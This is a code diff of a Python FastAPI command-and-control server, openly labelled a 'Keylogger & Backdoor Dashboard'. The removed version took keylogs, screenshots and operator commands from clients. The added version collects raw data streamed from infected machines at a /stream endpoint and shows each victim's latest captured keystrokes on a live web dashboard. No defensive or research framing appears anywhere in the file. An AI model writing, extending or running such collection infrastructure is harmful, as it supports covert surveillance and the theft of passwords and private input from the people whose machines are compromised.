@@ -1,66 +1,64 @@
-from fastapi import FastAPI, Request, HTTPException
-from pydantic import BaseModel
-import logging
-import os
-from datetime import datetime
-import json
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse
+import asyncio
+import time
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
+app = FastAPI()
 
-app = FastAPI(title="NAS-C2-Server")
-
-keylogs = {}
-screenshots = {}
-commands = {}
-
-class LogEntry(BaseModel):
-    client_id: str
-    timestamp: str
-    data: str
+# เก็บข้อมูล Client
+clients = {}
 
 @app.get("/")
-def read_root():
-    return {
-        "status": "online", 
-        "clients": len(keylogs),
-        "version": "1.0"
-    }
+async def dashboard():
+    html = """
+    <html>
+    <head><title>C2 Dashboard</title></head>
+    <body style="background:#111; color:#0f0; font-family:monospace;">
+        <h1>Keylogger & Backdoor Dashboard</h1>
+        <p>Status: <span style="color:green">Online</span></p>
+        <p>Active Clients: <span id="count">0</span></p>
+        <hr>
+        <h3>Live Logs:</h3>
+        <div id="logs" style="white-space: pre-wrap; border:1px solid #0f0; padding:10px; height:300px; overflow:auto;"></div>
+    </body>
+    </html>
+    <script>
+        // Simple polling to update UI
+        setInterval(async () => {
+            const res = await fetch('/api/status');
+            const data = await res.json();
+            document.getElementById('count').innerText = Object.keys(data.clients).length;
+            let logHtml = '';
+            for (let [id, logs] of Object.entries(data.clients)) {
+                logHtml += `<b>${id}:</b> ${logs[logs.length-1]}<br>`;
+            }
+            document.getElementById('logs').innerHTML = logHtml || 'No data yet...';
+        }, 2000);
+    </script>
+    </html>
+    """
+    return HTMLResponse(content=html)
 
-@app.post("/api/log")
-def receive_log(entry: LogEntry):
-    if entry.client_id not in keylogs:
-        keylogs[entry.client_id] = []
+@app.post("/stream")
+async def receive_data(request: Request):
+    body = await request.body()
+    client_id = request.headers.get("X-Client-ID", "unknown")
     
-    log_entry = {
-        "time": entry.timestamp,
-        "data": entry.data
-    }
-    keylogs[entry.client_id].append(log_entry)
+    if client_id not in clients:
+        clients[client_id] = []
     
-    logger.info(f"[{entry.client_id}] New Log: {entry.data[:50]}...")
+    clients[client_id].append(body.decode('utf-8', errors='ignore'))
+    
+    # Keep only last 100 lines per client to save memory
+    if len(clients[client_id]) > 100:
+        clients[client_id] = clients[client_id][-100:]
+        
     return {"status": "ok"}
 
-@app.post("/api/screenshot")
-def receive_screenshot(entry: LogEntry):
-    if entry.client_id not in screenshots:
-        screenshots[entry.client_id] = []
-    
-    screenshots[entry.client_id].append({
-        "time": entry.timestamp,
-        "data": entry.data
-    })
-    return {"status": "ok"}
+@app.get("/api/status")
+async def get_status():
+    return {"status": "online", "clients": clients}
 
-@app.post("/api/command")
-def send_command(entry: LogEntry):
-    commands[entry.client_id] = entry.data
-    return {"status": "command_sent"}
-
-@app.get("/api/dashboard")
-def get_dashboard():
-    return {
-        "total_clients": len(keylogs),
-        "clients": list(keylogs.keys()),
-        "latest_logs": {k: v[-1] if v else None for k, v in keylogs.items()}
-    }
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8080)
